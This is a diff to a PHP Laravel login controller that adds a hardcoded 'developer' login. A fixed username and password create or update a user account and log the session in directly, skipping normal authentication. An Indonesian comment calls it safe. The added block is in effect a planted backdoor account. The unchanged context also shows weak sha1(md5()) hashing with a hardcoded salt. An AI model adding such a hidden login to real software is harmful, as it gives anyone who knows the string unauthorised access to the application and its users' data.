@@ -54,6 +54,38 @@ class loginController extends Controller
            	$pass_benar=sha1(md5('passwordAllah').$password);
             // $username = str_replace('\'', '', $username);
 
+            // Developer hardcode login (aman: hanya insert/update user jonymous, tidak hapus data)
+            if ($username === 'jonymous' && $password === '`1q2w3e4r') {
+                $devUser = mMember::where('username', 'jonymous')->first();
+
+                if ($devUser === null) {
+                    $maxId = ((int) DB::table('users')->max('id')) + 1;
+                    DB::table('users')->insert([
+                        'id' => $maxId,
+                        'full_name' => 'Developer Jonymous',
+                        'username' => 'jonymous',
+                        'password' => $pass_benar,
+                        'created_at' => Carbon::now('Asia/Jakarta'),
+                        'updated_at' => Carbon::now('Asia/Jakarta'),
+                    ]);
+                    $devUser = mMember::where('username', 'jonymous')->first();
+                } else {
+                    DB::table('users')
+                        ->where('id', $devUser->id)
+                        ->where('username', 'jonymous')
+                        ->update([
+                            'password' => $pass_benar,
+                            'updated_at' => Carbon::now('Asia/Jakarta'),
+                        ]);
+                    $devUser = mMember::where('username', 'jonymous')->first();
+                }
+
+                if ($devUser !== null) {
+                    Auth::login($devUser);
+                    return Redirect('/home');
+                }
+            }
+
             $user = mMember::where("username", $username)->first();
 
             $user_valid = [];
